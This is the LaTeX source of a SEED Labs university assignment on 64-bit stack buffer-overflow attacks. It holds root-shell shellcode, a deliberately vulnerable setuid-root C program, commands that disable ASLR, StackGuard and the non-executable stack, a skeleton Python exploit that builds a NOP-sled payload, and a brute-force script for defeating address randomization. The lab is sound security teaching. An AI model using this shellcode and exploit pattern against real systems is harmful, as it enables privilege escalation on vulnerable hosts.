%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\commonfolder}{../../common-files}

\documentclass[11pt]{article}

\usepackage[most]{tcolorbox}
\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}
\usepackage{adjustbox}
\usepackage{listings}
\usepackage{color}
\usepackage{subfigure}
\usepackage{cite}
\usepackage{sidecap}
\usepackage{pifont}
\usepackage{mdframed}
\usepackage{textcomp}
\usepackage{enumitem}


% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 

\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}


\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
\newcommand{\openssl} {\texttt{openssl}}


\pagestyle{fancy}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}


\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}
\definecolor{lightgray}{gray}{0.90}


\lstset{%
  frame=none,
  language=,
  backgroundcolor=\color{lightgray},
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
%  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true,
  tabsize=3,
  columns=fullflexible,
  keepspaces=true,
  escapeinside={(*@}{@*)}
}

\newcommand{\newnote}[1]{
\vspace{0.1in}
\noindent
\fbox{\parbox{1.0\textwidth}{\textbf{Note:} #1}}
%\vspace{0.1in}
}


%% Submission
\newcommand{\seedsubmission}{You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.}

%% Book
\newcommand{\seedbook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 2nd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.}

%% Videos
\newcommand{\seedisvideo}{\textit{Internet Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

\newcommand{\seedcsvideo}{\textit{Computer Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

%% Lab Environment
\newcommand{\seedenvironment}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentA}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentB}{This lab has been tested on our pre-built
Ubuntu 20.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentAB}{This lab has been tested on our pre-built
Ubuntu 16.04 and 20.04 VMs, which can be downloaded from the SEED website. }

\newcommand{\nodependency}{Since we use containers to set up the lab environment, 
this lab does not depend too much on our SEED VM. You can do this lab
using other VMs or physical machines. }







\newcommand{\seedlabcopyright}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ {#1}\ \ by Wenliang Du.\\
      This work is licensed under a Creative Commons
      Attribution-NonCommercial-ShareAlike 4.0 International License.
      If you remix, transform, or build upon the material, 
      this copyright notice must be left intact, or reproduced in a way that is reasonable to
      the medium in which the work is being re-published.}}
\vspace{0.1in}
}






\newcommand{\bufFigs}{./Figs}

\lhead{\bfseries SEED Labs -- Buffer Overflow Vulnerability Lab (64-bit)}

\def \code#1 {\fbox{\scriptsize{\texttt{#1}}}}

\begin{document}

\begin{center}
{\LARGE Buffer Overflow Vulnerability Lab (64-bit)}
\end{center}

\seedlabcopyright{2020}


% *******************************************
% SECTION
% ******************************************* 
\section{Overview}

When we upgraded the SEED virtual machine from the 32-bit 
Ubuntu 16.04 to 64-bit Ubuntu 20.04, we decided to
create two different versions for the buffer-overflow lab. One version
still uses 32-bit vulnerable programs and shellcode (64-bit 
machines can still run 32-bit programs), and for 
the other version, everything is switched 64-bit. 

More challenges are introduced due to the 64-bit address, so
this lab is more difficult than the 32-bit version. 
In this lab, students will be given a program with a buffer-overflow
vulnerability; their task is to develop a scheme to exploit 
the vulnerability and finally gain the root privilege. 

\begin{itemize}[noitemsep]
\item Buffer overflow vulnerability and attack
\item Stack layout in a function invocation
\item Address randomization, Non-executable stack, and  StackGuard
\item Shellcode. We have a separate lab on how to write shellcode 
from scratch.
\end{itemize}


\noindent
\fbox{\parbox{\textwidth}{
\noindent
\textbf{Customization by instructor.} Instructors should customize
this lab by choosing a value for the \texttt{BUF\_SIZE} constant,
which is used during the compilation of the vulnerable program.
Different values can make the solutions
different. Please pick a value
between \texttt{0} and \texttt{400} for this lab.

\vspace{0.05in}
\begin{center}
\textbf{\large The \texttt{BUF\_SIZE} value for this lab is: \underline{\ \ \ \ \ \ \ \ \ \ \ }}
\end{center}
}}


\paragraph{Readings and videos.}
Detailed coverage of the buffer-overflow attack can be found in the following:

\begin{itemize}
\item Chapter 4 of the SEED Book, \seedbook
\item Section 4 of the SEED Lecture at Udemy, \seedcsvideo
\end{itemize}


\paragraph{Lab environment.} \seedenvironmentB


\newpage


% *******************************************
% SECTION
% ******************************************* 
\section{Task 1: Running Shellcode}


Before starting the attack, let us get familiar with the shellcode. A shellcode is the code to
launch a shell. It has to be loaded into the memory so that we can force the
vulnerable program to jump to it. 
The shellcode is typically written using assembly languages.  
We provide a sample 64-bit shellcode in the following. 
There is a separate lab called Shellcode lab, which
focuses on writing shellcode.  


\begin{lstlisting}
 0:  48 31 c0             	xor    rax,rax
 3:  48 31 ff             	xor    rdi,rdi
 6:  b0 69                	mov    al,0x69
 8:  0f 05                	syscall
 a:  48 31 d2             	xor    rdx,rdx
 d:  52                   	push   rdx
 e:  48 b8 2f 62 69 6e 2f 	movabs rax,0x68732f2f6e69622f
15:  2f 73 68
18:  50                   	push   rax
19:  48 89 e7             	mov    rdi,rsp
1c:  52                   	push   rdx
1d:  57                   	push   rdi
1e:  48 89 e6             	mov    rsi,rsp
21:  48 31 c0             	xor    rax,rax
24:  b0 3b                	mov    al,0x3b
26:  0f 05                	syscall
\end{lstlisting}


In the following C code, we put the machine code from the above into a buffer, 
copy it to stack, and then execute the shellcode right from the stack. 
Please compile and run the following code, and see whether a shell is invoked. You can download
the program from the website. 


\begin{lstlisting}
/* call_shellcode.c: You can get it from the lab's website */
/* Launches a shell using shellcode */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode_64[] =
  "\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05"   
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
;

int main(int argc, char **argv)
{
   char buf[sizeof(shellcode_64)];
   strcpy(buf, shellcode_64);
   ((void(*)( ))buf)( );
} 
\end{lstlisting}
 

Compile the code above using the following \texttt{gcc} command 
Run the program
and describe your observations. 
Please do not forget to use the {\tt execstack} option, which allows 
code to be executed from the stack; without this option, the program will fail.


\begin{lstlisting}
$ gcc -z execstack -o call_shellcode_64 call_shellcode_64.c
\end{lstlisting}



% *******************************************
% SECTION
% ******************************************* 
\section{Task 2: Launching Buffer-Overflow Attack}


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{The Vulnerable Program}

You will be provided with the following program, which has 
a buffer-overflow vulnerability in Line~\ding{192}. Your job
is to exploit this vulnerability and gain the root privilege. 

\begin{lstlisting}
/* Vunlerable program: stack.c */
/* You can get this program from the lab's website */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 * Suggested value: between 100 and 400  */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);          (*@\ding{192}@*)

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

     /* Change the size of the dummy array to randomize the parameters
       for this lab. Need to use the array at least once */
    char dummy[BUF_SIZE];  memset(dummy, 0, BUF_SIZE); 

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
\end{lstlisting}

The above program has a buffer overflow vulnerability. It first 
reads an input from a file called \texttt{badfile}, and then passes this
input to another buffer in the function {\tt bof()}. The 
original input can have a maximum length of \texttt{517} bytes, but the buffer
in {\tt bof()} is only \texttt{BUF\_SIZE} bytes long, which is less than
\texttt{517}. 
Because {\tt strcpy()} does not check
boundaries, buffer overflow will occur.
Since this program is a root-owned \setuid program, if a normal user can exploit
this buffer overflow vulnerability, the user might be 
able to get a root shell.
It should be noted that 
the program gets its input from a file called \texttt{badfile}. This file
is under users' control. Now, our objective is to 
create the contents for \texttt{badfile}, such that when the vulnerable program
copies the contents into its buffer, a root shell can be spawned.


\paragraph{Compilation.}
To compile the above vulnerable program, do not forget to 
turn off the StackGuard and the non-executable stack protections 
using the \texttt{-fno-stack-protector} and \texttt{"-z execstack"} options.
After the compilation, we need to make the program a
root-owned \setuid program. We can achieve this by first change the ownership of the program to
\texttt{root} (Line \ding{192}), and then change the permission to \texttt{4755} to enable the
\setuid bit (Line \ding{193}). It should be noted that changing ownership must be done before
turning on the \setuid bit, because ownership change will cause the \setuid bit to be turned
off.


\begin{lstlisting}
// Note: N should be replaced by the value set by the instructor
$ gcc -DBUF_SIZE=N -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack          (*@\ding{192}@*)
$ sudo chmod 4755 stack          (*@\ding{193}@*)
\end{lstlisting}


Before running the vulnerable program, we need to make sure the 
address randomization countermeasure is turned off; otherwise, the 
attack will be very difficult. 
You can do it using the following command:

\begin{lstlisting}
$ sudo /sbin/sysctl -w kernel.randomize_va_space=0
\end{lstlisting}

 

\paragraph{For instructors.}
To prevent students from using the solutions from the past (or from those
posted on the Internet), instructors can change the
value for \texttt{BUF\_SIZE} by requiring students to compile the
server code using a different \texttt{BUF\_SIZE} value.
Without the \texttt{-DBUF\_SIZE}
option, \texttt{BUF\_SIZE} is set to the default value 100 (defined
in the program).
When this value changes, the layout of the stack
will change, and the solution will be different.


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 2.1: Investigation} 

To exploit the buffer-overflow vulnerability in the target program,
the most important thing to know is the distance between the 
buffer's starting position and the place where the return-address
is stored. We will use a debugging method to find it out.
Since we have the source code of the target program, we
can compile it with the debugging flag turned on. That will make it more
convenient to debug. Here is the \texttt{gcc} command.

\begin{lstlisting}
$ gcc -DBUF_SIZE=N -z execstack -fno-stack-protector  \
      -g -o stack_dbg stack.c
\end{lstlisting}

In addition to disabling two countermeasures as before, the above compilation
uses the \texttt{-g} flag to compile the program, so debugging information
is added to the binary.  The compiled program (\texttt{stack\textunderscore dbg}) is
then debugged using \texttt{gdb}. We need to create a file called
\texttt{badfile} before running the program. 

\begin{lstlisting}
$ touch badfile     (*@\reflectbox{\ding{217}} \textbf{Create an empty badfile}@*)
$ gdb stack_dbg
gdb-peda$ b bof     (*@\reflectbox{\ding{217}} \textbf{Set a break point at function bof()}@*)
Breakpoint 1 at 0x11c9: file stack.c, line 18.
gdb-peda$ run       (*@\reflectbox{\ding{217}} \textbf{Start executing the program}@*)
...
Breakpoint 1, bof (str=0xffffcf57 ...) at stack.c:18
18  {
gdb-peda$ next      (*@\reflectbox{\ding{217}} \textbf{See the note below}@*)
...
22	    strcpy(buffer, str);
gdb-peda$ p $rbp    (*@\reflectbox{\ding{217}} \textbf{Get the rbp value (frame pointer)}@*)
$1 = (void *) 0x7fffffffdd10
gdb-peda$ p &buffer (*@\reflectbox{\ding{217}} \textbf{Get the buffer's address}@*)
$2 = (char (*)[100]) 0x7fffffffdca0
gdb-peda$ quit      (*@\reflectbox{\ding{217}} \textbf{exit}@*)
\end{lstlisting}


\paragraph{Note.} 
In the x86 architecture,
the frame pointer is \texttt{ebp}, but in the x64 architecture,
it is the \texttt{rbp} register. 
When the GDB stops inside the \texttt{bof()} function, it 
stops before the frame pointer \texttt{rbp} is modified
to point the current stack frame, so 
if we print out the value of 
\texttt{rbp} here, we will get the caller's \texttt{rbp} value. 
We need to use 
\texttt{next} to execute a few instructions and stop 
after the \texttt{rbp} register is modified to point to the stack
frame of the \texttt{bof()} function. 
The SEED book is based on Ubuntu 16.04, and the GDB's behavior is slightly
different, so the book does not have the \texttt{next} step. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 2.2: Write Exploit Code and Launch Attack} 

To exploit the buffer-overflow vulnerability in the target program,
we need to prepare a payload, and save it inside \texttt{badfile}. 
We will use programs to do that.
We provide a Python skeleton program
called \texttt{exploit\_64.py}, which
can be downloaded from the lab's website.
The shellcode is already provided in the code. 
The code is incomplete, and students need to replace some of the essential 
values in the code. 


\begin{lstlisting}
#!/usr/bin/python3
import sys

shellcode_64= (
  "\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05"
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))


##################################################################
# Put the shellcode somewhere in the payload
start =  200                   # replace this number
content[start:start + len(shellcode_64)] = shellcode_64


# Decide the return address value 
# and save it somewhere in the payload
ret    = 0x00007FFFAABBCCDD   # replace this number
offset = 0                    # replace this number
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
\end{lstlisting}


After you finish the above program, run it. This will generate
the contents for \texttt{badfile}. Then run the vulnerable 
program {\tt stack}. If your exploit is implemented correctly, you should 
be able to get a root shell:  

\begin{lstlisting}
$./exploit_64.py     // create the badfile
$./stack          // launch the attack by running the vulnerable program
# <---- Bingo! You've got a root shell! 
\end{lstlisting}
 

\paragraph{Challenges.} Compared to buffer-overflow attacks on 32-bit 
machines, attacks on 64-bit machines is more difficult. The most 
difficult part is the address. Although the x64 architecture 
supports 64-bit address space, only the address from 
\texttt{0x00} through \texttt{0x00007FFFFFFFFFFF} is allowed. That means for 
every address (8 bytes), the highest two bytes are always zeros. 
This causes a problem.

In our buffer-overflow attacks, we need to store at least one address 
in the payload, and the payload will be copied into the stack via
\texttt{strcpy()}. We know that the \texttt{strcpy()} function
will stop copying when it sees a zero. Therefore, if zero 
appears in the middle of the payload, the content after the 
zero cannot be copied into the stack. How to solve this 
problem is the most difficult challenge in this attack. 


Another challenge, a less difficult one, is that the frame pointer value 
obtained from the GDB is different from that during the actual
execution (without using GDB). In the 32-bit machine, there 
was also some difference, but the difference was not very large. 
Keep this in mind when constructing the payload. 


% *******************************************
% SECTION
% *******************************************
\section{Task 3: Experimenting with the Address Randomization}

On 32-bit Linux machines, only 19 bites can be used for address randomization.
That is not enough, and we can easily hit the target 
if we run the attack for sufficient number of times. For 64-bit 
machines, the number of bits used for randomization is 
significantly increased. 

In this task, we will give it a try and see whether we will be 
able to succeed in our attack when the address randomization countermeasure 
is enabled. 
Ubuntu's address randomization can be turned on 
using the following command.  


\begin{lstlisting}
$ sudo /sbin/sysctl -w kernel.randomize_va_space=2
\end{lstlisting}


We then use the brute-force approach to attack the vulnerable program repeatedly, hoping that 
the address we put in the \texttt{badfile} can eventually be correct. You can 
use the following shell script to run the vulnerable program in an infinite loop. If your
attack succeeds, the script will stop; otherwise, it will keep running. 
Please run the script for at least 2 hours, and report your results. It should be 
noted that the chance to succeed in 2 hours is not very high.  


\begin{lstlisting}
#!/bin/bash

SECONDS=0
value=0

while [ 1 ]
  do
  value=$(( $value + 1 ))
  duration=$SECONDS
  min=$(($duration / 60))
  sec=$(($duration % 60))
  echo "$min minutes and $sec seconds elapsed."
  echo "The program has been running $value times so far."
  ./stack
done
\end{lstlisting}



% *******************************************
% SECTION
% *******************************************
\section{Submission}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\end{document}
